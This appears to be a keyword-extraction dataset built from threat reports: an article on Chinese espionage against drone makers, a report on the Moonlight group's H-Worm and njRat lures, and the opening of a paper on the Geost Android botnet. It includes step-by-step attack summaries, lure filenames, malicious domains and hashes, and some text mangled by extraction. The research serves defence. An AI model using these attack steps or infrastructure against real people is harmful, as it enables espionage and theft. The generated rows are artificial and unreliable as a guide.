engineer — with probable access to the European  rm’s proprietary drone intellectual property and technical data — was targeted as a part of this activity, which likely further demonstrates the motivation behind the operation. With access to the targeted company’s intellectual property, sensitive communications, and product roadmap, China could provide its favored companies with economic advantages such as:Integrating competitors’ unique or proprietary capabilities: Many commercial drones rely on custom software for capabilities such as stabilization, tracking, and GPS. Stealing and integrating competitors’ technologies would lessen any advantage that competitors would have over Chinese drones.Preempting competitors’ innovations: Leveraging compromised intellectual property on drone innovations could allow Chinese companies to advance their own product lines beyond what competitors plan to introduce in future products.Preempting  nancial or pricing moves from competitors: In an industry where price wars and gouging can have a signi cant impact on the competition, having the inside scoop on how your competitors plan to price their drones can provide an upper hand in attempting to undercut them and steal market share.Understanding competitors’ business and development plans or bid e orts: Insider information on how competitors plan to expand their business, augment manufacturing, market their product, or bid contracts, can all help Chinese drone companies gain an advantage over their competitors.url Espionage Evolution?4/52016/10/20ThreatConnect discovers Chinese APT activity in two European companiesEconomic Espionage Evolution?While Chinese cyber-enabled economic espionage may be less pronounced, it almost certainly hasn’t ended and likely has evolved to help solidify leading market shares. In some ways, solidifying the dominant Chinese  rm in a market feels like the next chapter in economic espionage. The overarching storyline of China’s economic espionage has been targeting strategic industries and allowing China to catch up with established champions. Chinese APT e orts against American Steel manufacturers [url ve-chinese-military-hackers-with-cyber-espionage-against-u.s.- corporations-and-a-labor-organization-for-commercial-advantage] likely facilitated the rise in Chinese world steel production from about 15% in 2000 to 50% in 2015 [url countries-around-the-world/] .China may be attempting to avoid the ire of the U.S. government as it targets organizations that are headquartered elsewhere. Furthermore, China may also be attempting to be more e cient as it focuses collection on organizations that meet multiple intelligence requirements. Targeting such organizations could allow China to explain away their activity as non-economic espionage, thereby adhering (with their  ngers crossed) to the Rose Garden agreement.Categories: Blog , Featured Article , Research , Threat ResearchA B O U T T H E A U T H O RWith ThreatConnect, security analysts can simultaneously coordinate with incident response, security operations and risk management teams while aggregating data from trusted communities. Your team will be better equipped to protect the organization from modern cyber threats, mitigate risk and address strategic business needs all thorough a single, robust platform. Start Using ThreatConnect Today for Free. Sign Up For Your Free Account Below!GET STARTED A DEMOSIGN UP HEREurl ","{'phrases': ['the attack', 'adobesys[.]com', 'targets', 'HttpBrowser', 'the malware', 'system info', 'access', 'strategic web compromises', 'energy management', 'IP', 'communications', 'Chinese companies'], 'target': 'the attack; adobesys[.]com; targets; HttpBrowser; the malware; system info; access; strategic web compromises; energy management; IP; communications; Chinese companies.'}"
the attackers; email; attachments; links; phishing emails; targets; Middle East; the document; malware; the victim; a link; AES; the malware; X; the infected machine; code; the malware; analysis; the system; the attackers; 0-days; exploits; system information; control; servers.,"['1. The attackers send emails with attachments or links to files that appear legitimate but have a .exe extension. 2. The attachments or links contain themes of interest to potential Middle Eastern victims as a form of social engineering. 3. If opened, the files install the H-Worm malware as a first stage backdoor. 4. The H-Worm malware is delivered via shortened URLs or domains impersonating Middle Eastern media. 5. Later stages use the installed H-Worm access to deliver additional malware like the njRat Remote Access Trojan. 6. njRat provides persistent access and control over the compromised system. 7. The command and control infrastructure uses dynamic domains hosted on home internet connections in the West Bank. 8. Over 200 varied malware samples were linked to the simple C2 infrastructure. 9. Earlier attacks were opportunistic, later attacks more targeted against specific groups/individuals. 10. The attacks rely on basic scripts and obfuscation rather than advanced exploits. 11. The motivations appear to be politically driven espionage rather than financial. 12. The tools and targets share connections with the Gaza Hacker Team. 13. Despite low sophistication, these attacks enable spying and could enable loss of life. ']","Extract the keywords: CompanyEnglishLEADERSHIPINVESTORSPRESS RELEASESMEDIA COVERAGEEVENTSBLOGAWARDSCAREERSCONTACT USCyber security information center Moonlight – Targeted attacks in the Middle EastPosted by Chris Doman on Oct 26, 2016 1:30:00 AMFind me on:Tweet Share185Vectra Threat Labs researchers have uncovered the activities of a group of individuals currently engaged in targeted attacks against entities in the Middle East. We identiﬁed over 200 samples of malware generated by the group over the last two years. These  attacks are themed around Middle Eastern political issues and the motivation appears to relate to espionage, as opposed to opportunistic or criminal intentions. These are not technically sophisticated attackers. However, they do deploy some novel tactics, detailed below, and the implications of these attacks could be signiﬁcant. Both the tools and targets of Moonlight are reminiscent of “Gaza Hacker Team,” a group of  attackers that are said to be politically aligned to the Hamas[1]. In spite of these commonalities, we have not identiﬁed any ﬁrm links   between the two groups. We refer to this group of attackers as Moonlight, after the name the attackers chose for one of their command-and-control domains.[1] url’s targetsVectra Networks worked with providers to sinkhole Moonlight’s command-and-control infrastructure. The hosts seen via our sinkhole show a clear targeting of Middle Eastern victims:Figure 1: Moonlight’s victims of attacks Most of these victims are connecting from home networks, and are therefore unidentiﬁable, though one notable victim is a  Palestinian news organization. Vectra believe the victims from the United States and China are outliers. These infected machines were primarily from university networks and were likely either security researchers sandboxing malware or overseas students targeted for links to their homeland. Indirect targeting data from to the online virus scanning site VirusTotal, and trafﬁc statistics from the URL linking services the  attackers use indicate many of these attacks are targeted towards either small groups or individual targets:Figure 2: The statistics show one of the attacker’s malicious ﬁles, registering only two clicks OpenMe.docx.exeThe attackers name their malware as documents of interest to their victims, to entice them to open them. The malicious decoy documents display themes relevant to Middle Eastern politics, and provide some indication as to who the intended targets may be:20160611-NCRI-AR-Rajavi-Syria-Ramadan.docx.exe Assassination of Talal of Jordan YouTube.exe Audio recording of the meeting of Egyptian Emirati. MP3.exe Brigadier Alleno behind moral projection of Zakaria al-Agha.docx.exe exe Fatah foreign conspiracies.exe Wapons and ammunition stores found while digging a waterway in Egyptian Rafah.exe Hamas and Fatah agree to the following.exe Hamas and the Egyptian army.exe Hamas and the Salaﬁst jihadist in the Gaza Strip.scr  Hamas Betrayal.exe Important leaking security meeting Arab Emirates.exe scr Leaked audio recording of the meeting of Egyptian security Emirates.mp3.exe Leaking important Arab Emirates security meeting.mp3.exe Meeting of the Executive Committee of the PLO.exe President sources oust Fatah leadership in Gaza and the cost Abu Samhadana to lead the organization.doc.exe Sawiris and the project of the Suez Canal.exe Sinai Bombings.docx.exe The full truth behind Abu Ghussains disease.exe The grandson of President Abbas in the festival of love, and what response was Mr. Samir Mashharawi him.exe The names of the perpetrators of the bombings in the Gaza Strip.exe The son of Mufti takﬁri Hamas ﬁst anti-drug police.docx.exe  Moonlight demonstrates that 0-days, or even exploits, aren’t required to successfully compromise machines. Instead, they show a preference for the classic social engineering approach of sending e-mails with attachments or links to ﬁles with the ﬁlename   [legitimate ﬁle-extension].exe, for example: scr Secrets documents Panama.docx.exe doc.exe Audio recording of the meeting of Egyptian Emirati.mp3.exeMoonlight typically makes good on the promised theme of the lures, and present the victim with a relevant “decoy document”:Figure 3: ""Meeting of the Executive Committee of the PLO"" - Decoy documents opened on victim machines by the malwareFigure 4: Decoy video about women trafﬁcked to Syria  Impersonated new organizationsThe attackers typically deploy malicious ﬁles via shortened URLs, presumably to look more innocuous. Many of the links and  domains impersonate Middle Eastern media organizations such as Eln News and Wattan TV:url url url domain impersonating the media, Alwatenvoice[.]com, also hosts “landing pages” to encourage victims to download the malware, described below.DistributionOne Facebook user has shared a number of posts from the malicious Alwatenvoice[.]com:Figure 5: Two pages containing malware shared by the user on Facebook The second post is of particular interest. The Facebook information box says the article is from All4Syria[.]info, a popular independent news outlet reporting on Syria, but in fact it leads to Alwatenvoice[.]com:Figure 6: The link to All4Syria[.]info that actually leads to Alwatenvoice[.]com The user is then presented with a page that looks very much like the real All4Syria website:ا(cid:2)(cid:8)(cid:9)(cid:10)رةا(cid:2)(cid:3)(cid:4)ر(cid:6)(cid:7)Figure 7: The malicious page on Alwatenvoice[.]com on the left, and the legitimate site All4Syria[.]nfo on the right If a user clicks “play,” they are asked to download malware named The proﬁle posting these malicious links has a very small number of public posts. The ﬁrst post from 2015 shows the user setting   their wallpaper to the logo of Fatah. There are two celebrations of Facebook friendship displayed publicly, one of whom can be identiﬁed from the name and Facebook proﬁle information. Their details match that of a senior Fatah militant who Reuters reported   was targeted for assassination during violent struggles between Hamas in Fatah in 2007. We would stress that even if the account is controlled by the attackers it could be an account that they have compromised, or impersonates an innocent and unconnected person. It is also possible that the account sharing the malicious links belongs to a user who is unknowingly spreading malicious content mp4.exe (“Syrian Prostitution Rings.mp4.exe”).(cid:12)(cid:13)(cid:14)(cid:10)تH-WormMoonlight typically delivers an obfuscated version of the widely available H-Worm[2], a malicious Visual Basic Script worm, as their ﬁrst stage backdoor. Moonlight deploy an ever-changing range of deployment scripts to evade anti-virus software. Many of these  use basic scripts within self-extracting RAR archives to install the malware:[2] urlﬁreeye.com/blog/threat-research/2013/09/now-you-see-me-h-worm-by-houdini.html Figure 8: Some of the malicious scripts used by Moonlight to deploy H-Worm In these excerpts, we see the Moonlight make some strange choices in deploying their malware such as:Opening a decoy document from the Windows System folder Preventing users from deleting any ﬁles (including the installed malware) from the  C:\temp\ folderThere is a large amount of variation in the scripts used to install malware, and it’s likely that the large number of samples have been produced by hand, rather than a more productionised process of using build tools that is preferred by more sophisticated groups.njRatRecords to URLs that users have submitted to VirusTotal record the attackers installing additional malware using the access they gained with the ﬁrst stage H-Worm malware. Examples of this are recorded in URLs submitted to VirusTotal [3] for the domain fun2[.]dynu.com:DateLocation2016-05-24C:/Users/Administrator/Desktop/service.exe2016-05-31C:/Users/Administrator/Desktop/WindowsService1.exe2016-08-10C:/users/administrator/desktop/k.exe2016-08-10C:/users/administrator/desktop/service.exe[3] url with earlier stages, the attackers employ a number of methods to deploy the well-known[4] njRat which seems to vary from sample to sample. In one example the malware stores a program within a base64 compressed blob. This is then loaded into memory, and executed using EntryPoint.Invoke():Figure 9: An example loader for njRat deployed by Moonlight[4] url and urlﬁles/fta-1009---njrat-uncovered.pdf The 24 Kb of code this decodes to is another .NET application – njRat. Other droppers also decrypt the blob, before it is executed. Both njRat and code obfuscators such as this are freely available[5], and there are a plethora of tutorials available online to help budding hackers use them with limited technical knowledge.[5] Eg; url signiﬁcant operation Moonlight’s command-and-control infrastructure is very simple. It consists of dynamic domains controlled via home internet connections in the West Bank of Palestine. We were surprised to identify a very large number of varied malware samples (over 200) attached to this simple infrastructure:Figure 10: Moonlight’s infrastructureAttacker evolutionThe earliest attacks appear to be non-targeted, opportunistically inviting victims to click links on Youtube videos and social media posts typical of Middle-Eastern “hacktivists.” Later attacks appear to target particular groups or individuals. Moonlight’s usage of the Google URL shortening service allows us to roughly compare attacks over time:Figure 11: One attack from December 2014 (left), and one from December 2015 (right)Who are the attackers?In general, the assigned IP-location of command and control servers is a poor indication[6] of attacker locations. However, in this case the provided locations of home networks in the Gaza strip are likely to be accurate and ﬁts with other details from the attacks.  The attackers also demonstrate low operational security, particularly in their earlier attacks. Domain Whois records and social media posts provide strong ideas as to the identities of some of those involved. It would not be prudent to publish the identities of the possible attackers in a conﬂict zone.  Perhaps a more interesting question is ""What are the attackers’ aims?"" Or if they are being directed, who is ultimately funding and tasking them?[6] With reference to url and url attacksAttacks such as these are often overlooked due to their low technical sophistication. But the stakes of these attacks are high, even if the attacker skill level is low. If the motivation behind these attacks is indeed political, the consequences could mean loss of life. Violence between rival political factions in Palestine has resulted in the deaths of hundreds of people. Individuals and organizations outside of the Middle East are unlikely to encounter the attacks by Moonlight. However, the tools and techniques deployed are typical of low-skilled but determined attackers within the Middle East and serve as an example of the kinds of attacks that often slip through. Moonlight’s strategy of obfuscating well known malware appears to be fairly successful at evading host-based security mechanisms. The network communications of the well-known malware families such as H-Worm and njRat should still trigger existing network signature base detection tools. Vectra customers are protected through the following generic detections:Suspicious HTTP – Provides generic detection of HTTP based malware such as H-Worm External Remote Access –Provides generic detection of RATs such as njRatMalware Update – Provides generic detection of secondary malware over HTTP(S)Security professionals can review the Appendix for a full listing of ﬁle-hashes and domains employed in these attackers.  Vectra Threat Labs operates at the precise intersection of security research and data science. We take unexplained phenomena seen in customer networks and dig deeper to ﬁnd the underlying reasons for the observed behavior. Click  here to read more of our reasearch.AppendixDomains Any trafﬁc to the following domains on your network should be investigated. Please note that many of these domains have been  sinkholed by Vectra . alwatenvoice[.]com elnnews-com.duckdns[.]org fun1.dynu[.]com fun2.dynu[.]com fun3.dynu[.]com fun4.dynu[.]com fun5.dynu[.]com h.safeteamdyndns[.]se h0tmail.duckdns[.]org hackteam1.spdns[.]de hema200.publicvm[.]com hema200.safeteamdyndns[.]se hema2000.dynu[.]com hp200.spdns[.]eu hp500.linkpc[.]net hp600.spdns[.]eu moonlights.linkpc[.]net new4.spdns[.]eu opstin.spdns[.]eu run500.linkpc[.]net run900.linkpc[.]net wattan24.duckdns[.]org aman-news[.]com MD5 HashesABD8F478FAF299F8684A517DCB1DF997 003F460F6EA6B446F31AA4DC57F3B027 568218BB07C021BBAB3B6D6560D7208CAC19A1E5D604D82EF81E35756F3A10D1 0392F8BE82A297242BAAD10A9A2912EB 573138482B185F493B49D3966650CDADAC3918287452FEBD3855FF4BC3D82A0704A4CC757B4D283FF8DE246C19E8D230 5947BBAD60D4D00EF545E2FB3B1FD03EAC89E42EE593CEA80030820618F2BCF604B2D3F38055B2B821B30E82C44D604059E18D4ED3C97279DB16984C07213EB1ACAB47BB5E8ED34056905FF63353CABC 0512F533BF2E8E5EC9637B804C101C2B 5BF5BE6B45292FBA0C0EDC415F248922ACCF82FC29467C08CE087072FEA3D14A 05618077C03B80ACE066B9851966FBB15CC9964DD41BE3D9DACBD0425EC032A9ACD58BB34BB275DE1570917624ADE609 0606FEE55F39784E9889C1AAA0F278825CFD542A561F1EE679FCD6AA81991F3AAE238D1E52CD4A9DECFE769FE5844747 064F0A5FCC869F6EB77405D3FE98AF87 5E59ACF240E2881B1C1E2F5586C9CA6FAE9E9E3C73483E8B6C6E58E5629DC4D0 07EB24224A722EA9D8A3DC610B834D7A 5F0437C7DC45D4C10A045954DB77DD31B053BBB499D68CCE1782B33FDE7B43FF 0975222DE39433A25E672595B1960CDB 61381610E76266423ACE96670DE45DC0B0B9332082E98D51CB7265A45A945A220A38DDCC3431BAE448E38C99562162EF 6212E9A07225D6B71769D2BBBC20CD04B184FA51604D7EAA5A45350D1E08E5B70A49531FC0C00E991E51F34398F3AB886218A61D18F5A74F82ABC31A5F073C4BB3FB8253595FED348464B5C9A01AD4AD 0ABBD2765B563F2B8748485FA84DA07062C0B9EA3638BEF977A7D33970E52E38B532676D6A5A6684B62A078BFBCBBD0B 0AED206FC534C310724E122BF6BCDF7F 63D933310CFB26EC9913A26BEF230A99B77A14A594A59C3B86EDD940FB35AB5E 0B2023BC4ADFBB8157DA9147B9FAFACB 64ACAFF36681B16C5717741E17DCB329B82DE5F1C26143083D988B06F6C927C30B40D67579AF550C0A3AEE359C2C71BA 64AF25B42E21F01A213C32CC66CFD749B841E134EC7FE48095754742C8A2B8D70BD3B5C667878830DA088527D1B753EC 655F56F880655198962CA8DD746431E8B929FC62DB2B3C8CC6A03063767BE125 0C15603B17FA333189AB5ED06E0993F7696232159428BCB2BDA5AC2C755E8FEDBB15E754AE3B85A12447B448F6F7E43E 0CA048153AC96E5C41243B364092AF0769A042C9ED90A30444606407F77E199FBBF576CF704B71C739E8777EB6C9FF820D67422BA42D4A548E807B0298E372C76C4B69C19F2C3AC23AC392B8631E31BBBD2234DAE56580AAA7F880A7DB0F397D 0E9B363DE7DD2B10AFD5D1947FA0E006 6C4D355411B8D7DA56A2C7C14693A3AEBE23B3AFD1FD32C900F012CB2A8BA755 0F83377C44ADBA238FD0F0EB241981A6 6D418227FEB7A60727326583B52187E6C28376FC9EE627B51E3F52503397E2DC 114B805F977E17558DD89E8029E29DF06E2E488CDDF1D15D0411F3838ED04683C291CFAC28F323F9808D633A8558A35A 118A606FB131C082B55A5625661B666A6EE7264D4A974D0FFFED7F39652D1DADC64052167D6A183A3ECC259EE0F3A0C6 129F4B0A1F209784BF7071C14119BF9F71B00CBD186B1C168FD207B8F43FC8E0C8D912CF5BF526E551972EBB5454DD3F 1325AB5DCA14B58A8A7B9A8F5A1EE4DC 72076B1B2D9CB0507E5C94C2B422CCE7C92E26AC3145718E531330B87772D21613AF6A3C3A3908FD4E606A1F19B0571472BEA803A834F7736679781A1D729B1FCB539DFAEECC4BAF875A1E431701FF9D 148A3E3CC76CF6753B15070FE3514DAE 7681AE3933F3E13EB8E2A9BE281A5763CC9FAEC3F39EDAF7A59E9D9A7577451C 14C1E03DE25811C3D6D467837A16BB29 76A68FE73FFF571F257A1B0F100ACA1DCCFA1B31C47C9F124FEFE206301B3A5F 15F7682A178F789EDB40CEAABA9E5103 77D02BE92D052F35604CAA9885DD9A77CD10D61A0D2D43A6AB16A9F50B1AD894 1673583BC5B7A485119D4A1342D6ADA8 7840F2473B3A0E0960A1925F3CD0C3B1CF51142459F7B40E751E91179C00129917D70C318C6D16EA599E39550C44FA7F 7A4588DC14AE38505662B75DA93CA8A7CFE26B57E168B6C6A18C668E36A3E939 1856F46DA93C3B152C358E0F6DB53402 7AEFB825277764CD9F31BC1F2370D18DD179427D46D38D78A7A60512A45954961966F3B1D4ADEC25AB866C4E061A1E50 7C14974DD39B071558C619D16C4216DBD24B6317064DA37D31CE4459AC7F4B69 1C4AB6CF907175D114C48C30A38BF379 7D1F1FED52745D36D737EFA7D43F4B95D297E0DB6D63A952B08B6F0E3FE101E7 1D693473FF431C7CEA3E7AB0130EAA3D 7D27548E3F56FA532C571FB409ECD7B6D3C8ECF591381B31D3AA796471B5B0F1 1F644DE33D57C12A393B12F92A7C44C5 7DD199B0C678EF409A7DC461DE850849D5DFF6DB76B75D346D3B33BBA5B7CBFA 215556AF1A5FEF7E08A6124D94487D2F 7ED4897B11798F4639C73D57F901A661D5EEE8DC2507D46E1DC11F7B7441F506 21CE82DB335964B8624F8EB0668B539F 833B3AF9BD8FFD0390BCA1D43EE78CC3D817FD5A442C7668607AE895D429804022CC7CE1E17852B6D09D5641B6ABCA0D 83AD97BF1D5A9044AAFBA6AAC4B7387ED9EACFF28841C51ACE9712AF78BCBDD0 24D2CE38D2886A00E678E8C23AD8D1CA 841C3AFAA8CAF0AC33BF783D5FEAEADBDD2D6B625E7ADD1528311A0CF5FD5EAE 276E54A5E32BEF12367C5B31BF9C179E 8492C3111C7C0998F0DC1B63967E5C65DDD73E73BE2CC934D5721D4FC62CD98C 27A1891DB06D316B43A48DDEFEBF73BF 853A53CF799E2E3E1FC244A0751A4E96DDEEE52C00A95167353215D14B3AAA68 2851685F217EB1CE573FC2BAE79188018799B3D6B2CE50D4DD5F5114635A4B96DE2E753D12CE07F7B3F97C498D3477F8 28FBFD2AD1B500B62377DDE5795CDF85 87E5555CFF74D41551D6D29B9C01C0CBDF38B1562E4F0B735B3E10BAE78DF2A9 2930596D4E1328B79C349455E71EE1B08943A561F0839D43B8BD476357992540E1B56D70FA5397509F901ED72724A5E929771C26BFDD125E7427CD57A98730FF 897061CD7F0BBAE1B024ED9C1C1998A1E3E2CD771C8183464737233D17CD6A092993B77D82622D665F9B2F06C89741BE 8A2E5662ED22D0D555E6B90FE5E1C902E42CD849370F2BE67F40B97B5D741B372A0F5D8C5BC021A1CEFED7442B02DF52 8AD4C22449B98339548D38BF87BF50AAE613FBAAF0E64B1CA740F9859D5CAF0B 2AB91CEDD813E306248E545075C60866 8BE6FBAD0618D6A398966AF3D20F5418E61732ADD06F5EB98FE6AD42CE9682F6 2C8C94E85EF8C757586590E8D1ABDC6C 8F8E5A9553A27A9341ED6022028B231DE8909F06EF95B222121B72E12DB2111D2CBD8E0EB9DF67E7D304F28803D4529E 8FDD4BA7920B3D6AB2F0106FDF4ED702E8C4A336C901A8799525EA30486838B32DC30F736F1A485DBBEED63EC9259726 8FF5EF99FAF5E17B7D5B46585BAC7B43EA788C263E04B93D36E0D82BB7D1BC05 2E49F5BD50A4E82DB05B4E42F18536F3 90C49D0CEF0DFCFF3C09723A9918688DEB7B7C974A66E7F9A0EAD3113F949EC8 2F352CD6486C518DDC61B7EBBEAB5F01 927DBA3C9B98FD749017E3DEE270136BECB97F19AB0568CD0536567A7DEF44FF 348D6C08F155F0781574C34E573B6F1F940A1B2C537FA2F764283795E9B665BAEF53161673CA4CAA7E9C4B33A0D02A90 36E3307F26E5B8BDBA30D7EA7CA62CD8 968EF6CB0DFB082DF7A68C3B8869C57BEFCA552B3CA4B8FF8686FD313FF2D48E 37CB0DF3AF8D3CA2086EEDAF3479D21C 974037C602A559C471BBDA3D07F50650EFE54DF820FA8434CF14A5A8F55F52B739581B22FB078851D6DAA492C4F5BE97 97AA47094205DF17C15ED216227C4DA8F007B759A30EDF46FD921E2D87A39D5D 3CE01AD1B116943F5FB1B2925C5DCAF1 99215ADB3D924F52D69BEAB6981791EBF17CD2526A0E46D806863E1320A2CF5B 3D2E266B9FDAD45AEF7D83164BEB7A37 992D434A726B9C50851B809FB95C169BF33B62D496F58E752BB190296781CFF93EAA4C1C6716133612CBA0EA4A6905B5 9A9D01BCB93EF99E1B8EBF727D72E91FF48AAB23D1DEF618449D70514615396640E9ED913857D5196368A64D9972FCB89EF41A195932EDE4E9E6800E7D272A2EF59453D2FF8F29617DB23201C568017C4484EB027D30C4705717CDE931245827 A12EB4CD0CAD629FCE59AE5120B82133F7CF132313438115B0BBED035078FB1C 476764A1E6E121CF59C7F101F0E14968A1E60D076CC9488EB7D86BD70FF70154F8AD6A207BEE8C042220CC52AF2DAC29 4791667A4935718C4A55FA23EB18A520A2E82ED55692BF64B819117C48F13F62F8FF494B1C0403C3C99C6D67BEF7069A 48A8E95E79787EB27465AAD52855788A A3296E4D931583415C2B1B7A68C96508F93A95668040E143F19F94210CA18D884C325C62D2CD9A69AA2CCF920A61B4C1 A3DFD16AC5E2E0343E61E19C13FCFF2BFA428FEF017B496DCAE6428889114FCC 4E3925ABF0CB66CE4476DFFC41131396 A62DE1A146EEC778344600F8EEE86DA9FA8C119B3F0B1F9C2AA9F5D8908C95364EB6B5F6E3CB72869F29D567AC888C05 A7BF176D5BD80C2AD3815EC41E9BA6E6FBB0BA6E2E570CA1B4F495F3040B6F6D 50B1E6E24A1DB4D68A2D51BD7115BAA3 A7F58A9D83CA22846282994A0393FB82FE71389ACD3EE1B42A0895668C73DC21 517822AF63D640DFE8C6590B36AD8F80 A803F9914141F2CA72EB0C2162E2BA36FE742125449AFABB37B21844171FBC9951817D6FA9F1BA398176ABE63230568A A866F515362066AEA4BBEF0B6C1BDB13FF295CF738DE580E2EE41D0100C848AE 53BADCB66F848805E781716F95CF10AB AA45A3DFD4E7329DF37D8C74F0DA01B4FFE598B9C3DE334571881035D478ABE4AA4774F70E080AB0A33C6B8F83C70589Topics: Targeted Attacks, Malware Attacks, cyber security, Threat Labs Subscribe to the Vectra BlogRecent PostsMoonlight – Targeted attacks in the Middle East Triggering MS16-030 via targeted fuzzing Exploiting the ﬁrewall beachhead: A history of backdoors into critical infrastructure  Bringing attack detection to the data center Reverse engineering the Shadow Brokers dump: A close look at NOPENPosts by Topic Cyberattacks (19) Malware Attacks (15) Insider Threats (13) cybersecurity (12) Targeted Attacks (12)see all Follow usGet security that thinks.See it think for you.REQUEST A DEMOAbout UsWhy Vectra PrivacyTerms of Use ","{'phrases': ['the attackers', 'mails', 'attachments', 'links', 'Eg', 'themes', 'interest', 'Middle Eastern victims', 'social engineering', 'H-Worm malware', 'shortened URLs', 'Middle Eastern media', 'stages', 'Use', 'additional malware', 'njRat', 'control', 'command', 'dynamic domains', 'home internet connections', 'the West Bank', 'over 200', 'varied malware samples', 'Earlier attacks', 'individuals', '10', 'the attacks', 'basic scripts', '11', 'the motivation', 'espionage', '12', 'the tools', 'targets', 'Gaza Hacker Team', '13', 'spite', 'these attacks', 'loss', 'life'], 'target': 'the attackers; mails; attachments; links; Eg; themes; interest; Middle Eastern victims; social engineering; H-Worm malware; shortened URLs; Middle Eastern media; stages; Use; additional malware; njRat; control; command; dynamic domains; home internet connections; the West Bank; over 200; varied malware samples; Earlier attacks; individuals; 10; the attacks; basic scripts; 11; the motivation; espionage; 12; the tools; targets; Gaza Hacker Team; 13; spite; these attacks; loss; life.'}"
the attackers; exploits; the HtBot malware; sensitive documents; the victim; the malware; communication; IP; IP addresses; IP addresses; the malware; communication; servers; communication; the attackers; the botnet; operators; IP addresses; Android devices; the attacks; privacy; the victims; the attacks; resources; the botnet; encrypt; chat sessions; the operators; IP addresses; servers; access; the networks; the geost botnet; IP addresses; time; infrastructure; infrastructure; victims; interest; the attackers; the botmasters; the operators; the development team; the development; the Geost botnet; the developers; the researchers; analysis; vulnerabilities; the Android devices; 10; the malware; a ransomware payment; the victims.,"[' 1. The attackers distribute malicious Android APK files, often masquerading as legitimate apps like banks, social networks, photo services, etc. 2. If the victim installs one of the malicious apps, it requests access to permissions like reading/sending SMS, contacts access, etc. 3. The infected app connects to one of the Geost C&C servers and PHP files. It sends information like SMS messages, contacts, location, etc back to the C&C. 4. The botnet operators log into the C&C dashboard to view all the collected personal data from victims, including SMS history, bank balances, names, addresses, etc. 5. The C&C panel provides options for the botmasters to target specific banks, manage spam campaigns, and possibly perform financial fraud by abusing the collected bank account information. 6. The extensive personal data harvested from victims provides the botmasters with information to aid social engineering attacks or identity theft. ']","Extract the keywords: GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID BANKING TROJAN FROM AN OPSECERRORSebastian GarciaCzech Technical University in Prague, Czech RepublicMaria Jose ErquiagaUNCUYO University, Czech RepublicAnna ShirokovaAvast Software, Czech Republicsebastian.garcia@agents.fel.cvut.cz; mariajoseerquiaga@gmail.com;shirokova@avast.comABSTRACT Maintaining a good operational security (OpSec) is difﬁ cult because it increases the cost of work and decreases the speed of actions. This is true both for security analysts and for attackers. This paper describes a new botnet, which we called Geost, that we discovered thanks to multiple OpSec mistakes made by the attackers. The mistakes included: the use of the HtBot malware’s illegal proxy network; failing to encrypt the command-and-control servers; re-using security services; trusting other attackers that practise even less operational security; and failing to encrypt chat sessions. As far as we know, the Geost botnet has hundreds of malicious domains, 13 C&C servers, approximately 800,000 victims in Russia, and potential access to several million Euros in bank accounts. Moreover, the operational security mistakes led to the discovery of the names of members of an underground group related to the Geost botmasters. It is seldom possible to gain such an insight into the decisions taken by attackers due to failures in their operational security. This paper summarizes the mistakes and the risks taken by the botmasters, provides an overview of the botnet operation, an analysis of the victims, and a study of the social relationships of the developers.1. INTRODUCTION It has always been difﬁ cult to know exactly how botnet owners (botmasters) operate. It is a complex task to understand the details of their decisions, to see inside their command-and-control (C&C) channels, and to glimpse into their conversations. The three main reasons why it has been difﬁ cult to ﬁ nd this information are:1. Malware authors operate some degree of operational security (from now on OpSec) in orderto hide information.2. The C&C channels are implemented using evasive techniques, such as random domainnames, overwhelming analysts with information. It may not legally be possible for analysts to access data and communications in remote servers.3.VIRUS BULLETIN CONFERENCE OCTOBER 20191GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.With all these obstacles combined, the security community rarely sees how botmasters operate, make decisions, and protect their communications. OpSec failures have been the reason for multiple important discoveries in cybersecurity. OpSec can be deﬁ ned as a ‘risk management process that encourages managers to view operations from the perspective of an adversary in order to protect sensitive information from falling into the wrong hands’ [1]. The consensus is that OpSec decisions should be carefully designed to be effective against a certain risk. Problems in OpSec are not limited to technical mistakes but include mistakes made in the correct evaluation of the risks taken, and the countermeasures applied for protection. This paper presents a very rare case of a chain of OpSec mistakes leading to the discovery of a new Android banking botnet targeting Russian citizens. It is unusual because the discovery was made when the botmasters decided to trust a malicious proxy network called HtBot. Our security laboratory had already been running samples of the HtBot malware for months when a trafﬁ c analysis revealed a group of infected computers being used to manage infected Android phones. The HtBot malware provides a proxy service that can be rented to provide secure connecting hosts for malicious activity. Our analysis of this HtBot communication led to the discovery and disclosure of a large operation infecting Android-based phones. After the initial discovery of the Geost botnet, the method of analysis consisted of extracting more information about the attacks, the victims, the operations, its capabilities, and ﬁ nally, about the group of developers related to the Geost botnet. Using pivoting techniques of threat hunting it was possible to uncover the C&C channels, the domains and IP addresses. Given that more than 72,600 victims were uncovered in just one C&C server, and there are at least 13 C&C channels, a conservative estimate of the total number of victims was calculated at 871,200.The OpSec failures of the Geost botmasters were signiﬁ cant enough to allow us to recover a large amount of information. First, the attackers had a ﬂ awed risk model when choosing the appropriate communication platform for hiding their tracks. They picked up an illegal proxy network, not knowing that the network was being monitored by our laboratory. Instead of trusting a good communication provider, they trusted the security of a badly maintained illegal network. Second, the botmasters didn’t protect their communications with several layers of encryption protocols – making it possible for us to see the content of their communications. Third, there was a leaked document on a public website that detailed the chatting activities of a group of developers working on the C&C website of the botnet. Since the chat was conducted over Skype, it is possible that it was leaked by a member of the group. Fourth, the chat log revealed that credentials were commonly passed unencrypted in the chat, giving access to very important information about them. In summary, a chain of small mistakes was enough to disclose the operation of a large Android banking botnet.This paper makes the following novel contributions:• Describes for the ﬁ rst time and names the Geost botnet, unknown to the security communityuntil now.• Provides an analysis of the OpSec mistakes that led to the discovery of the activities of acybercrime group acting in Russian-speaking countries.• Describes the complete infrastructure of the botnet and its victims.• Publishes indicators of compromise (IoCs) and information to enable the community to act uponthe Geost botnet.2VIRUS BULLETIN CONFERENCE OCTOBER 2019GEOST BOTNET. THE STORY OF THE DISCOVERY OF A NEW ANDROID GARCIA ET AL.• Performs a social analysis of the cybercriminal group discovered.• Makes available for the research community, upon request, all the datasets in reference to thediscovery of the Geost botnet.The remainder of this paper is organized as follows: Section 2 analyses the previous work in this area; Section 3 describes the discovery of the Geost botnet; Section 4 shows how the botnet operates; Section 5 analyses the infrastructure of the botnet; Section 6 studies the victims of the botnet; Section 7 discusses the attackers, botmasters and developers; and Section 8 presents our conclusions.2. PREVIOUS WORK There are several examples of mistakes made by malware authors that have led to the discovery of their identities. However, they are usually regarded as technical mistakes rather than OpSec problems [2]. Technical mistakes are usually discovered as a result of poor OpSec criteria, e.g. code 